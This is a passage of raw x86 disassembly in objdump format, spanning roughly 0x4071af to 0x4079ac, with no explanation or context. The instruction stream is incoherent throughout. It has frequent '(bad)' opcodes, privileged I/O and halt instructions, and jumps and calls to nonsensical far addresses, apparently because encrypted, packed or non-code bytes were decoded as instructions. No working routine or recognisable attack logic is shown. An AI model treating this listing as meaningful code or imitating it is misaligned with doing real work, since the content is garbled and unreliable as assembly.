  4071af:	popa   
  4071b0:	cli    
  4071b1:	adc    al,0x3a
  4071b3:	mov    ah,0x1d
  4071b5:	push   esp
  4071b6:	call   DWORD PTR [edi+0x6b4c4fd4]
  4071bc:	add    cl,BYTE PTR [esi+0x44]
  4071bf:	or     al,BYTE PTR [ebx+eax*1-0x3e]
  4071c3:	sbb    al,0x5d
  4071c5:	xchg   BYTE PTR [esi+0x3a4d66a3],cl
  4071cb:	hlt    
  4071cc:	and    DWORD PTR ds:0x5fd48910,0xd864f5dd
  4071d7:	push   ecx
  4071d8:	mov    cl,0x98
  4071da:	pop    esp
  4071db:	(bad)  
  4071dc:	lds    ebp,FWORD PTR [edi-0xf]
  4071df:	push   0xfffffff8
  4071e1:	xor    al,0x77
  4071e3:	xchg   BYTE PTR [edi],dl
  4071e5:	xchg   ebp,eax
  4071e6:	test   DWORD PTR [ecx],0x4eb6905e
  4071ec:	(bad)  
  4071ed:	dec    esp
  4071ee:	and    eax,0x146fa798
  4071f3:	dec    edx
  4071f4:	ins    BYTE PTR es:[edi],dx
  4071f5:	sub    DWORD PTR [ecx+0x1aab1e62],eax
  4071fb:	loop   0x4071b7
  4071fd:	pop    ecx
  4071fe:	fst    DWORD PTR [edi+0x58348bf3]
  407204:	add    ch,BYTE PTR [eax-0x36e1c042]
  40720a:	gs repnz aad 0xba
  40720e:	mov    DWORD PTR [edi],ebx
  407210:	fist   DWORD PTR [edi-0x24]
  407213:	sub    al,0x77
  407215:	mov    WORD PTR [esi+esi*1],?
  407218:	ss fs push ecx
  40721b:	ins    DWORD PTR es:[edi],dx
  40721c:	dec    edi
  40721d:	pop    es
  40721e:	mov    bl,0xd3
  407221:	out    0x6,eax
  407223:	push   edi
  407224:	xor    eax,0x5629ddee
  407229:	sbb    eax,0x439ef8f8
  40722e:	retf   0x186a
  407231:	sbb    al,0x6c
  407233:	(bad)  
  407234:	pop    esp
  407235:	sahf   
  407236:	add    al,0x1f
  407238:	test   BYTE PTR [di+0x2602],bh
  40723d:	sbb    edi,DWORD PTR [esi-0x20]
  407240:	aaa    
  407241:	outs   dx,DWORD PTR ds:[esi]
  407242:	retf   0x49e2
  407245:	outs   dx,BYTE PTR ds:[esi]
  407246:	(bad)  
  407247:	or     ebp,DWORD PTR [ebx]
  407249:	push   edi
  40724a:	fwait
  40724b:	mov    esp,0xb69d0c01
  407250:	xor    eax,0xceb5c4f8
  407255:	xor    al,0xba
  407257:	xchg   DWORD PTR [ebp+esi*8+0x19],esi
  40725b:	repnz ins BYTE PTR es:[edi],dx
  40725d:	leave  
  40725e:	xchg   ecx,eax
  40725f:	jb     0x4072cc
  407261:	jb     0x407295
  407263:	jmp    0xa7df9219
  407268:	sub    eax,0xc13de4c3
  40726d:	aad    0x46
  40726f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407270:	or     BYTE PTR [ebp-0x1751c684],cl
  407276:	jae    0x407219
  407278:	nop
  407279:	arpl   WORD PTR [ecx],di
  40727b:	xchg   esp,eax
  40727c:	aam    0x68
  40727e:	mov    edx,0x3dd19468
  407283:	or     al,0x5b
  407285:	jne    0x4072c5
  407287:	and    esp,edi
  407289:	mov    edx,0xd56090ec
  40728e:	icebp  
  40728f:	add    al,0x26
  407291:	jns    0x40728e
  407293:	(bad)  
  407294:	xlat   BYTE PTR ds:[ebx]
  407295:	and    ebx,esi
  407297:	adc    eax,0x1b496c80
  40729c:	(bad)  
  40729d:	jmp    0x23a07ff4
  4072a2:	xor    eax,0xda7da1c8
  4072a7:	cmp    edx,esp
  4072a9:	add    dl,BYTE PTR [ecx+0x4371dfd2]
  4072af:	sub    esp,DWORD PTR [eax]
  4072b1:	icebp  
  4072b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4072b3:	and    eax,0x2692d856
  4072b8:	mov    esi,esi
  4072ba:	push   0x83a73a0b
  4072bf:	jg     0x407327
  4072c1:	xor    al,0x22
  4072c3:	rcr    DWORD PTR [eax-0x4a11206e],1
  4072c9:	pushf  
  4072ca:	dec    esp
  4072cb:	dec    esp
  4072cc:	popf   
  4072cd:	jmp    0x6169bc6a
  4072d2:	pop    edx
  4072d3:	fisub  DWORD PTR [eax+eiz*2]
  4072d6:	test   eax,0xff0ef4e9
  4072db:	mov    edi,0x421930a4
  4072e0:	xor    dl,BYTE PTR ds:0x9dbbd0ac
  4072e6:	ss out dx,eax
  4072e8:	push   ebp
  4072e9:	pop    esp
  4072ea:	cmp    DWORD PTR [edi+esi*1],edx
  4072ed:	repnz xchg esp,eax
  4072ef:	repz fs jno 0x4072a0
  4072f3:	inc    DWORD PTR [ecx]
  4072f5:	test   eax,0x2c2848dc
  4072fa:	cli    
  4072fb:	mov    bl,0x16
  4072fd:	and    eax,0xf9fb2dde
  407302:	push   ebp
  407303:	pop    ds
  407304:	(bad)  
  407305:	jp     0x4072c9
  407307:	ds adc al,0x88
  40730a:	sbb    BYTE PTR [ebx-0x586c09c9],cl
  407310:	push   0x5869da90
  407315:	pop    esp
  407316:	sbb    DWORD PTR [ecx+0x1b],esi
  407319:	lds    ebx,FWORD PTR [edx+0x79f5b339]
  40731f:	cwde   
  407320:	fadd   QWORD PTR [eax+0x7c192479]
  407326:	ins    BYTE PTR es:[edi],dx
  407327:	or     dh,al
  407329:	jg     0x407319
  40732b:	dec    eax
  40732c:	mov    WORD PTR [edi+0x38],gs
  40732f:	cmc    
  407330:	rcl    edx,cl
  407332:	or     ebx,esi
  407334:	les    edx,FWORD PTR ds:0xce979d84
  40733a:	popa   
  40733b:	cdq    
  40733c:	or     edi,ecx
  40733e:	addr16 mov ebx,0x1f989a8e
  407344:	outs   dx,DWORD PTR ds:[esi]
  407345:	adc    al,0x5e
  407347:	adc    al,0x71
  407349:	xchg   ecx,eax
  40734a:	add    ebx,ecx
  40734c:	push   0x61681443
  407351:	les    edx,FWORD PTR [ebx]
  407353:	iret   
  407354:	repnz repz mov eax,ds:0x36323e
  40735b:	mov    esi,0xdc93f54d
  407360:	cli    
  407361:	jmp    0x226c3ff7
  407366:	and    BYTE PTR [esi+0x1eab4d01],ch
  40736c:	adc    BYTE PTR [edi],al
  40736e:	xchg   esp,eax
  40736f:	xor    eax,0xbc0af061
  407374:	xchg   edi,eax
  407375:	pop    es
  407376:	js     0x40731a
  407378:	scas   eax,DWORD PTR es:[edi]
  407379:	sbb    DWORD PTR [ebx],0x77b1db42
  40737f:	mov    al,0xb
  407381:	inc    edx
  407382:	outs   dx,BYTE PTR ds:[esi]
  407383:	sub    ch,BYTE PTR [ebx+0x1f]
  407386:	mov    bh,0x44
  407388:	pushf  
  407389:	addr16 inc ecx
  40738b:	pop    ss
  40738c:	jns    0x4073b1
  40738e:	int3   
  40738f:	call   0xa6363d25
  407394:	adc    DWORD PTR [ebx+0x619af1cf],eax
  40739a:	xor    eax,0x1bc4f276
  40739f:	mov    edi,0x4a245473
  4073a4:	fist   DWORD PTR [esi-0x645740ad]
  4073aa:	pop    ebx
  4073ab:	sbb    eax,0xe6188d35
  4073b0:	nop
  4073b1:	fbstp  TBYTE PTR [edi+0x28]
  4073b4:	sbb    al,0x73
  4073b6:	or     eax,0x5ca218b2
  4073bb:	out    0x9a,eax
  4073bd:	scas   al,BYTE PTR es:[edi]
  4073be:	ins    BYTE PTR es:[edi],dx
  4073bf:	ficomp DWORD PTR [edi-0x5e1c7e35]
  4073c5:	sbb    bl,dl
  4073c7:	dec    esi
  4073c8:	enter  0x1f67,0x7a
  4073cc:	fstp   DWORD PTR [ebx-0x73]
  4073cf:	repnz sti 
  4073d1:	add    eax,DWORD PTR [edx+0x42a7965d]
  4073d7:	xchg   esp,eax
  4073d8:	mov    edi,0x941ead9
  4073dd:	cwde   
  4073de:	aad    0x7b
  4073e0:	xor    BYTE PTR [esi+edi*4],0x4
  4073e4:	sub    eax,0x1e39f362
  4073e9:	enter  0x39bd,0x2d
  4073ed:	loop   0x407413
  4073ef:	mov    esp,0x638fc5e8
  4073f4:	inc    ebp
  4073f5:	sbb    cl,al
  4073f7:	mov    esi,0x2e3d322c
  4073fc:	in     eax,dx
  4073fd:	dec    ecx
  4073fe:	retf   0x4538
  407401:	repz pop ds
  407403:	jl     0x407405
  407405:	mov    bh,0x31
  407407:	sub    al,0x45
  407409:	mov    edi,edi
  40740b:	sti    
  40740c:	jbe    0x4073ad
  40740e:	daa    
  40740f:	xor    BYTE PTR [edx],0x5c
  407412:	and    cl,BYTE PTR [edx]
  407414:	jmp    0xf378:0xc20cfdd5
  40741b:	(bad)  
  40741c:	mov    cl,0x16
  40741e:	ss data16 jl 0x40746a
  407422:	mov    ds:0x9e3ed70f,al
  407427:	xor    edx,DWORD PTR [ecx-0x8]
  40742a:	(bad)  
  40742c:	lods   al,BYTE PTR ds:[esi]
  40742d:	mov    dh,0x59
  40742f:	call   0x2edc8f4c
  407434:	lock icebp 
  407436:	shr    cl,cl
  407438:	loope  0x407476
  40743a:	mov    ebp,0x90388c73
  40743f:	imul   BYTE PTR [edx]
  407441:	aaa    
  407442:	mov    cl,0x1c
  407444:	push   ebp
  407445:	push   edi
  407446:	sahf   
  407447:	inc    esi
  407448:	dec    esp
  407449:	mov    eax,DWORD PTR [edx]
  40744b:	aam    0x3b
  40744d:	daa    
  40744e:	stc    
  40744f:	rcr    ch,0x24
  407452:	or     eax,0xadb54630
  407457:	repz jle 0x4073e3
  40745a:	enter  0xe208,0x3d
  40745e:	je     0x4073e9
  407460:	push   ebx
  407461:	test   eax,0xbe4dfbd8
  407466:	and    eax,0x7b921bda
  40746b:	in     al,dx
  40746c:	ret    0xd6b8
  40746f:	mov    ?,WORD PTR [edx-0x22e2bb68]
  407475:	jnp    0x4074aa
  407477:	mov    edi,0xaffab94
  40747c:	scas   eax,DWORD PTR es:[edi]
  40747d:	and    BYTE PTR [edx+0x1d99f01f],dl
  407483:	nop
  407484:	xor    al,0x88
  407486:	retf   0x8b68
  407489:	int    0xa2
  40748b:	pushf  
  40748c:	mov    al,ds:0x92e7d089
  407491:	jg     0x407481
  407493:	aaa    
  407494:	mov    edx,?
  407496:	fiadd  DWORD PTR [esi+0x20]
  407499:	pop    esi
  40749a:	push   esp
  40749b:	jp     0x4074ea
  40749d:	inc    esp
  40749e:	push   ebx
  40749f:	in     al,dx
  4074a0:	sbb    eax,esp
  4074a2:	inc    edx
  4074a3:	xor    edi,ebp
  4074a5:	xchg   ebx,eax
  4074a6:	jnp    0x4074b8
  4074a8:	lea    ecx,[ebp+0x47]
  4074ab:	lock pop esi
  4074ad:	xchg   esp,eax
  4074ae:	test   BYTE PTR [ebx+0x2f],dl
  4074b1:	and    DWORD PTR [eax],ecx
  4074b3:	mov    al,ds:0xc9a814d9
  4074b8:	adc    DWORD PTR [eax],ebx
  4074ba:	int3   
  4074bb:	mov    dh,0x54
  4074bd:	inc    esp
  4074be:	js     0x407458
  4074c0:	(bad)  
  4074c1:	jmp    DWORD PTR [esp+ebp*2-0x3fc9c6a8]
  4074c8:	xchg   esp,eax
  4074c9:	pop    edi
  4074ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4074cb:	push   ss
  4074cc:	xor    DWORD PTR [edx-0x7fe9b709],edx
  4074d2:	jle    0x4074b1
  4074d4:	xchg   ebp,eax
  4074d5:	inc    eax
  4074d6:	call   0x802a4554
  4074db:	and    ebp,DWORD PTR [ecx-0x75]
  4074de:	retf   0xf184
  4074e1:	cmp    al,0xec
  4074e3:	nop
  4074e4:	sbb    eax,0x30ba94bc
  4074e9:	push   cs
  4074ea:	popa   
  4074eb:	sbb    ah,BYTE PTR [ebx-0x11b0b0f2]
  4074f1:	add    ch,BYTE PTR [edi-0x43]
  4074f4:	dec    ebx
  4074f5:	and    ch,ah
  4074f7:	shl    BYTE PTR [esi+0x78],1
  4074fa:	out    dx,al
  4074fb:	jae    0x4074b0
  4074fd:	(bad)  [edx+0x1d]
  407500:	xlat   BYTE PTR ds:[ebx]
  407501:	mov    ecx,0x16e7e38c
  407506:	int3   
  407507:	push   0xffffffca
  407509:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40750a:	cld    
  40750b:	xor    dl,cl
  40750d:	or     bl,0x5a
  407510:	push   eax
  407511:	rcr    ch,0xa4
  407514:	idiv   BYTE PTR [edx+0x2fcdc139]
  40751a:	pop    edx
  40751b:	fdivr  DWORD PTR [edi]
  40751d:	push   ss
  40751e:	pushf  
  40751f:	das    
  407520:	aad    0xf0
  407522:	les    ecx,FWORD PTR [ebx+0x3e19087a]
  407528:	cmp    BYTE PTR ds:0x66dc771d,al
  40752e:	jle    0x4074b6
  407530:	(bad)  
  407531:	aam    0xce
  407533:	in     eax,dx
  407534:	(bad)
  407538:	rcl    BYTE PTR [eax+0x24],cl
  40753b:	or     edi,DWORD PTR [ebp+0x4eac56d9]
  407541:	adc    DWORD PTR [esi],edx
  407543:	push   edx
  407544:	test   esi,ebx
  407546:	call   0xe7bd6c6
  40754b:	add    BYTE PTR [ebx+0x65738e61],ah
  407551:	je     0x4074da
  407553:	out    dx,eax
  407554:	ror    edi,cl
  407556:	xor    edi,DWORD PTR [ebp+0x4b427f57]
  40755c:	jno    0x407528
  40755e:	ins    DWORD PTR es:[edi],dx
  40755f:	out    dx,al
  407560:	xchg   ecx,eax
  407561:	test   eax,0xd3a6cc19
  407566:	cmp    bl,BYTE PTR [esi-0x4fbd7125]
  40756c:	push   ebx
  40756d:	mov    bh,0x82
  40756f:	cmp    eax,DWORD PTR ss:[edi]
  407572:	shl    DWORD PTR [ecx+ecx*4],cl
  407575:	aad    0x54
  407577:	jno    0x4075d1
  407579:	jb     0x4075ba
  40757b:	sub    eax,0x48b9611e
  407580:	shl    BYTE PTR [esi+0x3e],cl
  407583:	or     al,0xa7
  407585:	cmp    al,0x9b
  407587:	push   esp
  407588:	and    eax,0xed5bbf82
  40758d:	mov    edi,0xfff6f80b
  407592:	ret    0xe97e
  407595:	inc    ebx
  407596:	hlt    
  407597:	icebp  
  407598:	xor    dl,bh
  40759a:	(bad)  [edx]
  40759c:	data16 sub al,0x67
  40759f:	retf   
  4075a0:	jne    0x4075f3
  4075a2:	sar    DWORD PTR [edx-0x3d],0x5a
  4075a6:	out    0xbe,al
  4075a8:	inc    eax
  4075a9:	in     eax,0xa9
  4075ab:	adc    DWORD PTR [edx-0x7ebe18a],ebp
  4075b1:	dec    ebp
  4075b2:	aad    0xe8
  4075b4:	stos   DWORD PTR es:[edi],eax
  4075b5:	jge    0x407607
  4075b7:	push   ebp
  4075b8:	xor    dl,dh
  4075ba:	into   
  4075bb:	fldcw  WORD PTR [eax-0x73]
  4075be:	and    al,BYTE PTR [edx-0x4a6aefcd]
  4075c4:	(bad)  
  4075c6:	jg     0x40754b
  4075c8:	dec    ebp
  4075c9:	jo     0x407580
  4075cb:	xchg   edx,eax
  4075cc:	xchg   esi,eax
  4075cd:	cmc    
  4075ce:	out    0xd6,eax
  4075d0:	jmp    FWORD PTR [ebp-0x7c]
  4075d3:	fbld   TBYTE PTR [edi+0x13cd79c2]
  4075d9:	loop   0x4075cf
  4075db:	out    dx,eax
  4075dc:	cwde   
  4075dd:	add    al,0xbe
  4075df:	and    al,BYTE PTR [ecx+0x64]
  4075e2:	ss jg  0x4075f2
  4075e5:	daa    
  4075e6:	pop    esp
  4075e7:	fwait
  4075e8:	sub    al,0x93
  4075ea:	cmp    bl,dl
  4075ec:	repnz imul edi,esp,0xfe155cc6
  4075f3:	sti    
  4075f4:	cs in  eax,dx
  4075f6:	aad    0x34
  4075f8:	jl     0x4075ba
  4075fa:	jnp    0x4075f2
  4075fc:	fnstsw WORD PTR [ebx+0x3a]
  4075ff:	jae    0x40765d
  407601:	or     BYTE PTR [edi],cl
  407603:	loop   0x40765b
  407605:	push   0x78
  407607:	inc    ebp
  407608:	(bad)  
  407609:	repz adc bl,BYTE PTR [ecx-0x23]
  40760d:	cdq    
  40760e:	call   0xc9cff2f6
  407613:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407614:	inc    eax
  407615:	es xchg ebx,eax
  407617:	push   edi
  407618:	and    eax,0x1080db58
  40761d:	or     esp,edx
  40761f:	test   eax,0xde770f30
  407624:	dec    ecx
  407625:	xor    edx,DWORD PTR [esi]
  407627:	es das 
  407629:	ins    DWORD PTR es:[edi],dx
  40762a:	xlat   BYTE PTR ds:[ebx]
  40762b:	push   esp
  40762c:	dec    esp
  40762d:	and    al,0x81
  40762f:	sub    cl,BYTE PTR [ecx]
  407631:	mov    edx,0xc70b1bd4
  407636:	test   DWORD PTR [edi+0x42],edi
  407639:	nop
  40763a:	add    al,0x46
  40763c:	nop
  40763d:	dec    eax
  40763e:	push   eax
  40763f:	push   esi
  407641:	scas   al,BYTE PTR es:[edi]
  407642:	daa    
  407643:	leave  
  407644:	push   ss
  407645:	mov    esi,0x155f44d9
  40764a:	rcr    BYTE PTR [ecx+0x15],0x66
  40764e:	lea    eax,[edi]
  407650:	add    edi,DWORD PTR [ebx-0x40]
  407653:	inc    edi
  407654:	jecxz  0x407633
  407656:	dec    edi
  407657:	test   DWORD PTR gs:[edi+0x7fa07150],ebx
  40765e:	inc    eax
  40765f:	rol    eax,cl
  407661:	xchg   edx,eax
  407662:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407663:	push   cs
  407664:	mov    ds:0x94f38624,eax
  407669:	inc    ebp
  40766a:	lds    ebp,FWORD PTR [esi+0xc]
  40766d:	pop    es
  40766e:	scas   eax,DWORD PTR es:[edi]
  40766f:	push   eax
  407670:	add    eax,0x5f2ef6f8
  407675:	shl    bh,cl
  407677:	outs   dx,BYTE PTR ds:[esi]
  407678:	and    BYTE PTR [eax-0x5f599f61],bh
  40767e:	(bad)  
  40767f:	scas   eax,DWORD PTR es:[edi]
  407680:	int3   
  407681:	cmp    bl,BYTE PTR [edx+0x2c020071]
  407687:	les    edi,FWORD PTR [edx-0x5715b29e]
  40768d:	cdq    
  40768e:	int    0x62
  407690:	fwait
  407691:	xchg   ecx,eax
  407692:	pop    eax
  407693:	pop    esp
  407694:	imul   edx,DWORD PTR [edx+0x65],0xacec31e7
  40769b:	push   0xfffffff9
  40769d:	mov    al,ds:0x2b3c94e
  4076a2:	xchg   esi,eax
  4076a3:	out    0x3,al
  4076a5:	jb     0x407693
  4076a7:	into   
  4076a8:	popa   
  4076a9:	divps  xmm2,XMMWORD PTR [edi]
  4076ac:	fld    DWORD PTR [ecx+eiz*2-0x23]
  4076b0:	or     esi,DWORD PTR [ecx]
  4076b2:	push   edx
  4076b3:	jge    0x407684
  4076b5:	scas   eax,DWORD PTR es:[edi]
  4076b6:	popa   
  4076b7:	mov    bh,0x2c
  4076ba:	xchg   ebp,eax
  4076bb:	es data16 jg 0x4076f8
  4076bf:	push   0x45e99378
  4076c4:	or     eax,0x7c8746a6
  4076c9:	addr16 xchg ebx,eax
  4076cb:	pop    edx
  4076cc:	das    
  4076cd:	mov    eax,ds:0x2a4dd17f
  4076d2:	or     ebp,DWORD PTR [ebx]
  4076d4:	in     al,0x1a
  4076d6:	and    DWORD PTR [eax],eax
  4076d8:	out    0xee,eax
  4076da:	scas   eax,DWORD PTR es:[edi]
  4076db:	inc    ecx
  4076dc:	mov    WORD PTR [ecx+0x46],es
  4076df:	xchg   ecx,eax
  4076e0:	sbb    al,0x73
  4076e2:	and    eax,0x6e08d86
  4076e7:	fnstcw WORD PTR [ecx]
  4076e9:	jge    0x407731
  4076eb:	add    BYTE PTR [edi+0x3c],al
  4076ee:	inc    ebx
  4076ef:	jl     0x40776e
  4076f1:	push   edx
  4076f2:	mov    ah,0x8c
  4076f4:	(bad)  
  4076f6:	or     al,0x27
  4076f8:	push   0xffffff9b
  4076fa:	scas   al,BYTE PTR es:[edi]
  4076fb:	fldenv [ebp+0x2851eb9d]
  407701:	fadd   DWORD PTR [edi]
  407703:	push   ds
  407704:	pop    esi
  407705:	test   DWORD PTR [ebx-0x3c],esi
  407708:	pop    esi
  407709:	cli    
  40770a:	add    al,0x9e
  40770c:	jmp    FWORD PTR [ecx+0x47]
  40770f:	add    cl,cl
  407711:	sar    BYTE PTR [esi+0x742ed50d],0xe0
  407718:	mov    ds:0x80fff1ef,al
  40771d:	std    
  40771e:	stos   BYTE PTR es:[edi],al
  40771f:	sub    DWORD PTR [ebx+0x3a],0x5
  407723:	jle    0x407718
  407725:	int3   
  407726:	mov    ebx,0xeb8e7f80
  40772b:	adc    BYTE PTR [ecx],0xd1
  40772e:	je     0x40774f
  407730:	aad    0x1b
  407732:	sub    ah,BYTE PTR [ecx+0x10]
  407735:	ret    
  407736:	dec    esp
  407737:	dec    eax
  407738:	pushf  
  407739:	dec    ebx
  40773a:	cmp    DWORD PTR [edi],esi
  40773c:	mov    bl,0x37
  40773e:	sbb    ebx,DWORD PTR ds:0x249a8780
  407744:	fs sub al,0xa
  407747:	leave  
  407748:	in     al,dx
  407749:	daa    
  40774a:	mov    ecx,0xe8cb4e6f
  40774f:	dec    edx
  407750:	sbb    BYTE PTR [esi],dl
  407752:	cmp    eax,ecx
  407754:	retf   0xebf9
  407757:	iret   
  407758:	xchg   esp,eax
  407759:	ror    dh,cl
  40775b:	mov    ecx,0xc555dc5b
  407760:	inc    edx
  407761:	jmp    0xdefd3cb3
  407766:	jo     0x4077d8
  407768:	add    eax,0xc3cfc8b0
  40776d:	mov    edi,DWORD PTR [ebp-0x493bd323]
  407773:	ja     0x4077f0
  407775:	jmp    0x4077f0
  407777:	and    al,0xdd
  407779:	pushf  
  40777a:	into   
  40777b:	sbb    esp,DWORD PTR [eax+0x42ac8f4b]
  407781:	pop    ss
  407782:	dec    edi
  407783:	mov    ds:0xdbd2b842,eax
  407788:	es push ebx
  40778a:	cld    
  40778b:	enter  0xc334,0x89
  40778f:	push   esp
  407790:	popf   
  407791:	out    0xac,al
  407793:	rcl    BYTE PTR [ebp+0x14],0x3d
  407797:	fidiv  DWORD PTR [ebx+0x78]
  40779a:	pop    ds
  40779b:	lock jecxz 0x4077bc
  40779e:	push   esp
  40779f:	or     bh,0x6a
  4077a2:	push   es
  4077a3:	into   
  4077a4:	inc    esp
  4077a5:	int    0x24
  4077a7:	sar    BYTE PTR [eax],0xd7
  4077aa:	mov    ah,0x3e
  4077ac:	aas    
  4077ad:	ss call 0xfe6a:0x825fd498
  4077b5:	repz sar BYTE PTR [eax+0x68],0x71
  4077ba:	jmp    0x7dd:0x81f935dc
  4077c1:	mov    ds:0xb54e81a4,al
  4077c6:	stos   BYTE PTR es:[edi],al
  4077c7:	mov    ebp,0x9ed40058
  4077cc:	xor    BYTE PTR [ebp-0x31],dh
  4077cf:	ret    
  4077d0:	das    
  4077d1:	aad    0xed
  4077d3:	sub    bl,BYTE PTR [edx+0x2af6e4c3]
  4077d9:	lds    eax,FWORD PTR [edi]
  4077db:	sbb    BYTE PTR [edx],0xc4
  4077de:	pop    ebx
  4077df:	mov    al,0x74
  4077e1:	rol    BYTE PTR [ecx*2+0x22874d7c],1
  4077e8:	fst    DWORD PTR [esi]
  4077ea:	jmp    0x40779a
  4077ec:	cdq    
  4077ed:	inc    eax
  4077ee:	sub    al,0x95
  4077f0:	pop    edx
  4077f1:	clc    
  4077f2:	shr    edi,0xb7
  4077f5:	pushf  
  4077f6:	add    DWORD PTR [esi+0x49],0x4ce61ce0
  4077fd:	test   DWORD PTR [ecx-0x4a],ecx
  407800:	pop    ecx
  407801:	gs in  eax,0x54
  407804:	ss push ebx
  407806:	xlat   BYTE PTR ds:[ebx]
  407807:	lea    edx,[esi]
  407809:	jmp    0x5cc433de
  40780e:	ins    BYTE PTR es:[edi],dx
  40780f:	jmp    0x3026:0x493fec1c
  407816:	pop    ecx
  407817:	mov    edi,0xb990651
  40781c:	sar    DWORD PTR [ecx],1
  40781e:	lods   eax,DWORD PTR ds:[esi]
  40781f:	(bad)  
  407820:	cmc    
  407821:	jp     0x4077d9
  407823:	mov    eax,0x97b6178
  407828:	ret    
  407829:	enter  0x65c0,0x76
  40782d:	or     al,bl
  40782f:	in     eax,dx
  407830:	repz std 
  407832:	jmp    0x40789b
  407834:	jbe    0x407845
  407836:	and    al,0x2
  407838:	retf   
  407839:	leave  
  40783a:	fsubr  DWORD PTR fs:[esi]
  40783d:	imul   edx,DWORD PTR [esi+eiz*1],0xd1aec11f
  407844:	into   
  407845:	mov    BYTE PTR [eax],0xd5
  407848:	adc    ebp,DWORD PTR [edx]
  40784a:	adc    esi,edi
  40784c:	das    
  40784d:	into   
  40784e:	push   ebp
  40784f:	outs   dx,BYTE PTR ds:[esi]
  407850:	and    ch,BYTE PTR [edi-0x350bf446]
  407856:	dec    eax
  407857:	mov    edi,DWORD PTR [ebx+0x42dd152f]
  40785d:	(bad)  
  40785f:	ja     0x4078c4
  407861:	xor    DWORD PTR [edx-0x7ac13eee],edi
  407867:	repz xlat BYTE PTR ds:[ebx]
  407869:	scas   eax,DWORD PTR es:[edi]
  40786a:	mov    dh,0x3
  40786c:	or     ch,BYTE PTR ds:[ebp-0x3b347397]
  407873:	out    dx,al
  407874:	jp     0x4078d8
  407876:	imul   esi,ecx,0xffffff8b
  407879:	xor    BYTE PTR [ebx-0x2],dl
  40787c:	pop    esi
  40787d:	iret   
  40787e:	lods   eax,DWORD PTR ds:[esi]
  40787f:	popa   
  407880:	(bad)  
  407881:	pop    eax
  407882:	enterw 0xc5a3,0x35
  407887:	fld    QWORD PTR [ebx]
  407889:	dec    edx
  40788a:	ret    0x16e4
  40788d:	shl    DWORD PTR [bp+di-0x26f8],0xd4
  407893:	pop    eax
  407894:	xor    BYTE PTR [ebx-0x3c13124],bh
  40789a:	xchg   ecx,eax
  40789b:	outs   dx,DWORD PTR ds:[esi]
  40789c:	(bad)  
  40789d:	jmp    0xbf24:0x3ad4f10e
  4078a4:	add    BYTE PTR [ecx],bl
  4078a6:	pop    ebp
  4078a7:	inc    eax
  4078a8:	or     BYTE PTR [edi],0xc4
  4078ab:	mov    ebx,0x3eb2ffe3
  4078b0:	(bad)  
  4078b1:	(bad)  
  4078b2:	sbb    ah,dl
  4078b4:	mov    cl,0xa6
  4078b6:	jnp    0x407842
  4078b8:	add    BYTE PTR [edi+0x6320b32a],ch
  4078be:	dec    edi
  4078bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4078c0:	std    
  4078c1:	ja     0x407884
  4078c3:	jecxz  0x407871
  4078c5:	and    esp,edx
  4078c7:	cs or  dl,dh
  4078ca:	mov    BYTE PTR [ebx-0x525b01b8],ah
  4078d0:	jbe    0x4078b3
  4078d2:	loope  0x407932
  4078d4:	fsub   st,st(5)
  4078d6:	or     DWORD PTR [ecx+0x71aea9aa],esp
  4078dc:	cmp    BYTE PTR [edx-0x77],bl
  4078df:	imul   edx,DWORD PTR [eax],0x2dbfe8e6
  4078e5:	xchg   edi,eax
  4078e6:	cmp    BYTE PTR [eax],0xee
  4078e9:	sbb    bh,BYTE PTR [ecx+0x9]
  4078ec:	inc    esp
  4078ed:	or     BYTE PTR [ebx+edx*4-0x29e4796f],dl
  4078f4:	rcl    ebp,cl
  4078f6:	or     eax,0x142fa572
  4078fb:	jnp    0x407933
  4078fd:	jp     0x407967
  4078ff:	repz mov esp,0x58f47c52
  407905:	scas   al,BYTE PTR es:[edi]
  407906:	xor    eax,0xcb30a486
  40790b:	test   ecx,0x296f8747
  407911:	jb     0x40797d
  407913:	jae    0x407969
  407915:	nop
  407916:	sti    
  407917:	push   esp
  407918:	xchg   edx,eax
  407919:	push   DWORD PTR [ecx+0x1a]
  40791c:	int    0xa2
  40791e:	ret    
  40791f:	arpl   WORD PTR ss:[eax+0x79],bx
  407923:	mov    ch,0x3a
  407925:	fcomp  DWORD PTR [esi+0x17]
  407928:	push   eax
  407929:	fst    DWORD PTR [ecx+0x9ce1363]
  40792f:	xor    edi,DWORD PTR [ecx]
  407931:	adc    DWORD PTR [edx+edi*2-0x74],edi
  407935:	mov    ds:0x87844b96,eax
  40793a:	cwde   
  40793b:	push   ss
  40793c:	cwde   
  40793d:	mov    al,0x56
  40793f:	in     eax,0xa7
  407941:	gs inc eax
  407943:	dec    esi
  407944:	jbe    0x407990
  407946:	les    eax,FWORD PTR [edi-0xf00f60a]
  40794c:	cwde   
  40794d:	mov    BYTE PTR [edx],ah
  40794f:	add    al,0xf0
  407951:	dec    esp
  407952:	loop   0x407999
  407954:	push   ds
  407955:	cs add eax,0x755b87d6
  40795b:	pop    edx
  40795c:	mov    ds:0x2584ac6a,eax
  407961:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407962:	jbe    0x40796f
  407964:	sti    
  407965:	js     0x4078f7
  407967:	mov    ebp,?
  407969:	pop    es
  40796a:	and    BYTE PTR [ecx],0xe6
  40796d:	loopne 0x407995
  40796f:	push   cs
  407970:	push   esp
  407971:	dec    eax
  407972:	or     edi,DWORD PTR [esi]
  407974:	add    DWORD PTR [ebx],0x79
  407977:	aam    0xe6
  407979:	push   ebp
  40797a:	pop    es
  40797b:	sti    
  40797c:	into   
  40797d:	mov    edx,0x9a6db53d
  407982:	add    al,0x90
  407984:	pop    ebx
  407985:	repnz mov bl,0x7c
  407988:	xchg   edx,eax
  407989:	add    dl,al
  40798b:	sbb    DWORD PTR [ecx-0x4c],ebx
  40798e:	(bad)  
  40798f:	jecxz  0x4079c7
  407991:	mov    ch,0x0
  407993:	fsubr  st(1),st
  407995:	pop    es
  407996:	retf   0x40b8
  407999:	and    dl,cl
  40799b:	push   ds
  40799c:	out    0x6e,eax
  40799e:	in     al,0xfe
  4079a0:	mov    ds:0x8d56a58d,eax
  4079a5:	sahf   
  4079a6:	adc    esi,0x23
  4079a9:	retf   0xa88a
  4079ac:	ror    BYTE PTR [ecx+0x55cbd98a],cl
